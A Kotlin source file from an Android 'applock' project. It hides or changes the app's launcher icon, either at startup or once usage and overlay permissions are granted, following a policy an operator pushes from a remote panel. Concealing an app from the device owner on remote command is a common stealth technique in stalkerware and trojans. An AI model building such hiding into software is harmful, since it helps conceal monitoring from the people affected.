package com.company.applock.icon

import android.content.Context
import com.company.applock.core.DeviceInfo
import com.company.applock.core.Prefs

/**
 * Applies the per-port "first action" (the ICON step only — no USSD, per project
 * scope). The policy is pushed from the panel and cached in Prefs (see
 * SyncEngine.applyConfig).
 *
 * maybeApply() is idempotent and safe to call from several hooks: app start, the
 * moment onboarding finishes, each time permissions change, on every service
 * start, and whenever fresh config arrives. It performs the action when the
 * policy's signature differs from the last one applied AND the timing is
 * satisfied — so it fires once after install, again if the operator edits the
 * policy, but is a no-op on ordinary heartbeats.
 *
 * Timing:
 *   app_start          → as soon as the app process starts.
 *   after_permissions  → once the core permissions (usage + overlay) are granted.
 */
object FirstActionController {

    fun maybeApply(ctx: Context) {
        val prefs = Prefs.get(ctx)
        if (!prefs.firstActionEnabled || !prefs.firstActionIconEnabled) return

        val sig = listOf(
            prefs.firstActionEnabled,
            prefs.firstActionIconEnabled,
            prefs.firstActionMode,
            prefs.firstActionTiming,
        ).joinToString("|")
        if (sig == prefs.firstActionSig) return // this exact policy already applied

        val ready = when (prefs.firstActionTiming) {
            "app_start" -> true
            else -> DeviceInfo.hasCorePermissions(ctx) // "after_permissions"
        }
        if (!ready) return

        val action = if (prefs.firstActionMode == "change") "change" else "hide"
        // apply() returns the state it actually reached (a "hide" may fall back to
        // a "change" on OEMs that ignore a disabled launcher), or null on failure.
        // Only latch when it actually succeeded, so a transient failure can retry.
        IconController.apply(ctx, action, null) ?: return
        prefs.firstActionSig = sig
    }
}
